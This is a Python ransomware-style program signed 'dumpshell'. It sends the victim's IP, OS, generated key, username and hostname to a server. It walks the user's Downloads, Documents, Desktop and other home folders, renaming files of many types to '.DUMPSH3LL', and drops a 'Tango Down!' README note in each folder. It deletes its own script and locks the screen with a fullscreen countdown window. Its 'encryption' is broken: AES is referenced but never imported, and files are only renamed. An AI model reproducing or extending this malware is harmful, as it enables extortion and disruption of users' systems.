import os, sys, socket, string, random, hashlib, getpass, platform, threading, datetime, time, base64
from PIL import Image, ImageTk
from pathlib import Path
from tkinter import *
from tkinter.ttk import *
from io import BytesIO








class mainwindow(Tk):
    def __init__(self):
        Tk.__init__(self)
        self.title(string = "Tango Down!") # Set window title
        self.resizable(0,0) # Do not allow to be resized
        self.configure(background='black')
        #self.overrideredirect(True)
        self.attributes("-fullscreen", True)
        self.style = Style()
        self.style.theme_use("clam")

        photo_code = '''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
'''

        photo = PhotoImage(data=photo_code)
        photo = photo.subsample(4)

        label = Label(self, image=photo, background = 'black')
        label.image = photo # keep a reference!
        label.grid(row = 5, column = 0, rowspan = 2)
        label = Label(self, image=photo, background = 'black')
        label.image = photo # keep a reference!
        label.grid(row = 5, column = 3, rowspan = 2)

        message = '''Tango Down!
    


Dumpsh3ll kill your system!!!d'ont reboot!


   by dumpshell


'''
        Label(self, text = message, font='Helvetica 16 bold', foreground = 'white', background = 'red').grid(row = 0, column = 0, columnspan = 4)

        Label(self, text = '', font='Helvetica 18 bold', foreground='red', background = 'black').grid(row = 5, column = 2)
        Label(self, text = '', font='Helvetica 18 bold', foreground='red', background = 'black').grid(row = 6, column = 2)


        def start_thread():
            # Start timer as thread
            thread = threading.Thread(target=start_timer)
            thread.daemon = True
            thread.start()

        def start_timer():
            Label(self, text = 'TIME LEFT:', font='Helvetica 18 bold', foreground='red', background = 'black').grid(row = 5, column = 0, columnspan = 4)
            try:
                s = 36000 # 10 hours
                while s:
                    min, sec = divmod(s, 60)
                    time_left = '{:02d}:{:02d}'.format(min, sec)

                    Label(self, text = time_left, font='Helvetica 18 bold', foreground='red', background = 'black').grid(row = 6, column = 0, columnspan = 4)
                    time.sleep(1)
                    s -= 1
            except KeyboardInterrupt:
                print('Closed...')

        if os == 'Windows':
            pass
        else:
            start_thread()


def getlocalip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))
    return s.getsockname()[0]

def gen_string(size=64, chars=string.ascii_uppercase + string.digits):
      return ''.join(random.choice(chars) for _ in range(size))

# Encryption
def pad(s):
    return s + b'\0' * (AES.block_size - len(s) % AES.block_size)




host = '127.0.0.1'
port = 8989

key = hashlib.md5(gen_string().encode('utf-8')).hexdigest()
key = key.encode('utf-8')

global os_platform
global name
os_platform = platform.system()
hostname = platform.node()

# Encrypt file that endswith
ext = ['.txt',
'.ppt',
'.pptx',
'.doc',
'.docx',
'.gif',
'.jpg',
'.png',
'.ico',
'.mp3',
'.ogg',
'.csv',
'.xls',
'.exe',
'.pdf',
'.ods',
'.odt',
'.kdbx',
'.kdb',
'.mp4',
'.flv',
'.iso',
'.zip',
'.tar',
'.tar.gz',
'.rar',
'.py ',
'.dossier',
'.ruby',
'.c',
'.zip',
]

def get_target():
    # Get user home:
    return str(Path.home()) + '/'

def start_encrypt(p, key):
    message = '''Tango Down!
    


Dumpsh3ll kill your system!!!d'ont reboot!


   by dumpshell


'''
    c = 0

    dirs = ['Downloads',
'Documents',
'Pictures',
'Music',
'Desktop',
'Onedrive',
'Bureau',
]

    try:
        for x in dirs:
            target = p + x + '/'
            

            for path, subdirs, files in os.walk(target):
                for name in files:
                    for i in ext:
                        if name.endswith(i.lower()):
                            
                            try:
                                os.rename(os.path.join(path, name), os.path.join(path, name) + '.DUMPSH3LL')
                                c +=1
                                
                            except Exception as e:
                                
                                pass

                try:
                    with open(path + '/README.txt', 'w') as f:
                        f.write(message)
                        f.close()
                except Exception as e:
                    
                    pass

        os.remove(sys.argv[0])
    except Exception as e:
        
        pass # continue if error

def connector():
    server = socket.socket(socket.AF_INET)
    server.settimeout(10)

    try:
        # Send Key
        server.connect((host, port))
        msg = '%s$%s$%s$%s$%s' % (getlocalip(), os_platform, key, getpass.getuser(), hostname)
        server.send(msg.encode('utf-8'))

        start_encrypt(get_target(), key)

        main = mainwindow()
        main.mainloop()

    except Exception as e:
        # Do not send key, encrypt anyway.
        start_encrypt(get_target(), key)
        main = mainwindow()
        main.mainloop()
        pass



try:
    connector()
except KeyboardInterrupt:
    sys.exit(0)

